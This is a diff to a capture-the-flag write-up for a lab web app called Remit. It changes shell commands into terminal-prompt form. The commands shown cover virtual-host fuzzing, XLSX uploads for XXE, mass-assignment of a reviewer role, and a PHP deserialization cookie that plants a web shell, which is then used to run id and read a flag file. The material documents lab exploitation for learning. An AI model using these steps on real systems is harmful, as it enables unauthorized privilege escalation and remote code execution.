@@ -104,8 +104,8 @@ The key thing this diagram makes clear: **the same IP and port** serve both appl
 An initial `ffuf` run produced hundreds of false-positive matches because the filter size (`-fs 145`) didn't match the actual "no vhost matched" response (`Size: 138`). Every non-matching request falls through to the same default nginx response, so an incorrect filter shows *everything* as a hit.
 
 ```bash
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -u http://10.100.0.30/ -H "Host: FUZZ.remit.local" -c -fs 145
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.100.0.30/ -H "Host: FUZZ.remit.local" -c -fs 145
 ```
 
 **Lesson:** always confirm the baseline "no match" response size with a throwaway hostname before trusting `-fs`, or use `-ac` for auto-calibration.
@@ -124,9 +124,8 @@ Field name: invoice
 ```
 
 ```bash
-curl -v -b "PHPSESSID=<supplier_session>" \
-  -F "invoice=@baseline_invoice.xlsx" \
-  http://remit.local/invoices/upload
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -b "PHPSESSID=<supplier_session>" -F "invoice=@baseline_invoice.xlsx" http://remit.local/invoices/upload
 ```
 
 Response confirmed: `Received. Your invoice was queued for review.` — the invoice number `CTF-BASELINE-001` appeared correctly in the portal's invoice table.
@@ -153,9 +152,8 @@ A plain UTF-8 payload with a `<!DOCTYPE>` declaration was rejected:
 ```
 
 ```bash
-curl -v -b "PHPSESSID=<supplier_session>" \
-  -F "invoice=@test_utf8_doctype.xlsx" \
-  http://remit.local/invoices/upload
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -b "PHPSESSID=<supplier_session>" -F "invoice=@test_utf8_doctype.xlsx" http://remit.local/invoices/upload
 ```
 
 Response:
@@ -357,7 +355,8 @@ GET /leak?d=<base64 blob> HTTP/1.1  -> 404 (expected; capture is via access log)
 #### 4.3 Decoding the leak
 
 ```bash
-echo "<base64 blob>" | base64 -d
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ echo "<base64 blob>" | base64 -d
 ```
 
 This recovered the full router (`index.php`), immediately revealing the application's file layout:
@@ -462,9 +461,8 @@ The developer comment gives away everything needed: the field is unrestricted, a
 > The deeper lesson: **an allowlist is only as trustworthy as the process that decides what goes on it, and for how long.** A single shared `$ALLOWED` array, reused by every caller regardless of who they are or what they're allowed to do, collapses two very different trust levels (supplier-editing-their-own-name vs. staff-assigning-roles) into one code path. The fix in the remediation section — separate request DTOs for supplier updates vs. staff onboarding — exists precisely so that each caller only ever sees the fields *it* is entitled to set, rather than one list shared across every use case that ever touches this table.
 
 ```bash
-curl -v -b "PHPSESSID=<supplier_session>" \
-  -d "full_name=kuro&company=Kuroz&role=remit_reviewer" \
-  http://remit.local/account
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -b "PHPSESSID=<supplier_session>" -d "full_name=kuro&company=Kuroz&role=remit_reviewer" http://remit.local/account
 ```
 
 Response: `Profile updated.`
@@ -476,17 +474,15 @@ Response: `Profile updated.`
 `remit.local` and `review.remit.local` maintain **separate session stores** even though they share a user database — replaying the supplier `PHPSESSID` against `review.remit.local` (even with a spoofed `Host` header) returned a `302` redirect to `/login`. A fresh login was required, this time using `email`/`password` fields (not `username`, as initially assumed):
 
 ```bash
-curl -v -H "Host: review.remit.local" \
-  -d "email=<supplier_email>&password=<supplier_password>" \
-  http://remit.local/login
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -H "Host: review.remit.local" -d "email=<supplier_email>&password=<supplier_password>" http://remit.local/login
 ```
 
 Response: `302 Found`, `Location: /queue`, and a **new** `PHPSESSID` distinct from the supplier one.
 
 ```bash
-curl -v -H "Host: review.remit.local" \
-  -b "PHPSESSID=<new_reviewer_session>" \
-  http://remit.local/queue
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -H "Host: review.remit.local" -b "PHPSESSID=<new_reviewer_session>" http://remit.local/queue
 ```
 
 Result: `200 OK`, full invoice queue HTML, sidebar showing `Reviewer` role — console access achieved.
@@ -526,9 +522,8 @@ Sessions are host-scoped; the database role is what's shared. Changing the role 
 Interacting with the queue's filter/sort options set a cookie:
 
 ```bash
-curl -v -H "Host: review.remit.local" \
-  -b "PHPSESSID=<reviewer_session>" \
-  "http://remit.local/queue?status=received&sort=oldest"
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -H "Host: review.remit.local" -b "PHPSESSID=<reviewer_session>" "http://remit.local/queue?status=received&sort=oldest"
 ```
 
 Response header:
@@ -540,7 +535,8 @@ Set-Cookie: remit_view=YToyOntzOjY6InN0YXR1cyI7czo4OiJyZWNlaXZlZCI7czo0OiJzb3J0I
 Decoded:
 
 ```bash
-echo "YToyOntzOjY6InN0YXR1cyI7czo4OiJyZWNlaXZlZCI7czo0OiJzb3J0IjtzOjY6Im9sZGVzdCI7fQ" | base64 -d
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ echo "YToyOntzOjY6InN0YXR1cyI7czo4OiJyZWNlaXZlZCI7czo0OiJzb3J0IjtzOjY6Im9sZGVzdCI7fQ" | base64 -d
 # a:2:{s:6:"status";s:8:"received";s:4:"sort";s:6:"oldest";}
 ```
 
@@ -647,9 +643,8 @@ O:20:"Remit\Report\Archive":2:{
 Built, base64-encoded, and sent as the `remit_view` cookie:
 
 ```bash
-curl -v -H "Host: review.remit.local" \
-  -b "PHPSESSID=<reviewer_session>; remit_view=<url_encoded_base64_payload>" \
-  http://remit.local/queue
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -v -H "Host: review.remit.local" -b "PHPSESSID=<reviewer_session>; remit_view=<url_encoded_base64_payload>" http://remit.local/queue
 ```
 
 The destructor fired at request teardown, writing the shell into the review application's webroot (`/proc/self/cwd/` resolved correctly to the webroot in this environment).
@@ -657,20 +652,20 @@ The destructor fired at request teardown, writing the shell into the review appl
 Triggering it:
 
 ```bash
-curl -H "Host: review.remit.local" \
-  'http://remit.local/<shell>.php?c=id'
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -H "Host: review.remit.local" 'http://remit.local/<shell>.php?c=id'
 # uid=1201(avery) gid=1201(avery) groups=1201(avery)
 ```
 
 Locating and reading the flag:
 
 ```bash
-curl -H "Host: review.remit.local" \
-  'http://remit.local/<shell>.php?c=find+/+-maxdepth+4+-iname+"*flag*"+2>/dev/null'
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -H "Host: review.remit.local" 'http://remit.local/<shell>.php?c=find+/+-maxdepth+4+-iname+"*flag*"+2>/dev/null'
 # /home/avery/flag.txt
 
-curl -H "Host: review.remit.local" \
-  'http://remit.local/<shell>.php?c=cat+/home/avery/flag.txt'
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ curl -H "Host: review.remit.local" 'http://remit.local/<shell>.php?c=cat+/home/avery/flag.txt'
 ```
 
 ```
@@ -833,14 +828,16 @@ if __name__ == "__main__":
 **Result:**
 
 ```
-$ python3 gadget.py
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ python3 gadget.py
 [*] Building and sending Archive gadget cookie...
 [+] Gadget request sent -> status 200
 [*] Running: id
 [+] Output:
 uid=1201(avery) gid=1201(avery) groups=1201(avery)
 
-$ python3 gadget.py --skip-write --cmd 'cat /home/avery/flag.txt'
+┌──(kuroshiro㉿a1sberg)-[~/Webverse/Remit]
+└─$ python3 gadget.py --skip-write --cmd 'cat /home/avery/flag.txt'
 [+] Output:
 WEBVERSE{00xml_bl1nd_*************************nj3ct}
 ```
